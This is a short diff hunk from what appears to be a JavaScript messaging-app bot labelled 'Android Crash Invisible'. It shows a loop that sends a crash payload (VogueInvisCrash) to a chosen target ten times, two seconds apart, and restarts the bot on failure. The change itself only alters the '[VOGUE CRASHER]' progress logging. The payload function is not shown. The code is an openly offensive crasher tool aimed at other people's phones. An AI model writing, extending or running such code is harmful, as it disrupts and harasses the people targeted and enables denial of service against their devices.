@@ -5128,13 +5128,15 @@ Description : Android Crash Invisible
             for (let i = 0; i < 10; i++) {
                 try {
                     await VogueInvisCrash(sock, target);
-                    console.log("[VOGUE CRASHER] BUG SENT")
-                    await sleep(2000)
+                    process.stdout.write(`\r[VOGUE CRASHER] Sent ${i + 1}/10...`);
+                    await sleep(2000);
                 } catch (e) {
-                    console.log(`[WORKER ${instanceId}] Error: ${e.message}`);
+                    console.log(`\n[WORKER ${instanceId}] Error: ${e.message}`);
                     await restartBot("Connection Closed");
                 }
             }
+            
+            process.stdout.write("\n");
             
             console.log(`[WORKER ${instanceId}] Done for ${q}`);
             
